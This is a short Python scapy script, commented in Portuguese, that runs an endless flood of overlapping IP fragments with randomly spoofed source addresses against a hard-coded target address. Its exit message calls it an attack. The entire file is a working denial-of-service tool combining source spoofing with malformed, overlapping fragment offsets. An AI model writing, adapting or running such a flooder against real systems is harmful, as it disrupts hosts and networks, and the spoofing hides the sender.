from scapy.all import *
import time
import random

target = "192.168.8.142"
interface = "en0"

try:
    while True:
        # Geramos um ID e um IP falso que duram 500 ciclos
        #current_id = random.randint(1000, 65535)
        ip_falso = str(RandIP())
        
        # p1: Fragmento inicial
        p1 = IP(src=ip_falso, dst=target, flags="MF", id=66)/UDP(sport=123, dport=80)/("A"*1400)
        p2 = IP(src=ip_falso,dst=target, frag=1, id=66, proto=17)/("B"*1400)
        send([p1, p2], iface=interface, verbose=False)
            
            # Pequeno delay para evitar que o Windows 10 (Host) sature
    #time.sleep(0.001) 
            
except KeyboardInterrupt:
    print("\nAtaque interrompido.")